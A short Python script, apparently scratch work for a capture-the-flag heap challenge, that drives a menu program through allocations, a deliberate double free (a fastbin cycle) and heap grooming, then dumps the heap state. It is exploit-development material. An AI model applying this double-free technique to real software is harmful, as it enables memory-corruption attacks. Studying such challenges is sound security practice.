import sys,os; sys.path.insert(0,"/mnt/c/Users/ha/Downloads/pwn")
from dumper import G
g=G("god2")
g.add(b"UNIQ777"); g.add(b"A1"); g.add(b"B2"); g.cook(b"Beef noodles"); g.add(b"YY"); g.add(b"Z9"); g.cook(b"Beef noodles")
for t in (b"B2",b"Z9",b"A1",b"YY"): g.rm(t)
g.add(b"CC"); g.cook(b"Beef noodles"); g.cook(b"Beef noodles"); g.cook(b"UNIQ777")
g.rm(b"UNIQ777"); g.rm(b"UNIQ777"); g.sell(b"2"); g.sell(b"3")   # fastbin[0x40] cycle
for i in range(5): g.make(b"f%d_xxxxxx"%i)   # consume 0x90 -> clean recipe adds
g.add(b"R"*16+b"A"); g.add(b"SLOTXX")
g.dump("dd6 dup + 5 foods + R,SLOT"); g.close()
